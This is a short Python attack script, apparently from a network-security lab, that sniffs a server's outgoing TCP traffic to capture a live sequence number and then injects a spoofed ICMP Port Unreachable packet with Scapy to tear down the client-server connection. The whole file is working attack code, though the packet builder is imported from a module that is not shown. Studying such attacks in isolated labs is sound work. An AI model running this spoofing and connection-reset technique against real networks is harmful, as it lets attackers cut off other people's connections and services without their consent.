#!/usr/bin/env python3
"""
Phase P4 — inject the spoofed ICMP Type 3, Code 3 reset packet.

Run from the attacker namespace:
    sudo ip netns exec attacker python3 attacks/inject_reset.py [--server-port 9999]

Sniffs the SERVER's own outgoing segments to the client to recover a seq
number inside the server's current send window (see build_packets.py's
module docstring for why it must be the server's own traffic, not the
client's), crafts the spoofed ICMP Type 3/Code 3 (Port Unreachable), and
injects it into the bridge with Scapy's send().
"""
import argparse

from scapy.all import send

from build_packets import CLIENT_IP, SERVER_IP, build_reset_packet, capture_live_state


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--iface", default="veth-at")
    parser.add_argument("--server-port", type=int, default=9999)
    parser.add_argument("--count", type=int, default=1,
                         help="stop sniffing as soon as this many matching segments are seen")
    parser.add_argument("--timeout", type=int, default=10)
    args = parser.parse_args()

    print(f"Sniffing {args.iface} for {SERVER_IP}:{args.server_port} -> {CLIENT_IP} traffic...")
    _, client_port, seq = capture_live_state(
        args.iface, SERVER_IP, args.server_port, CLIENT_IP, args.count, args.timeout
    )
    print(f"Captured: client_port={client_port} server_seq={seq}")

    pkt = build_reset_packet(client_port, args.server_port, seq)
    print("Injecting spoofed ICMP Type 3, Code 3 (Port Unreachable)...")
    send(pkt, verbose=False)
    print("Sent.")


if __name__ == "__main__":
    main()
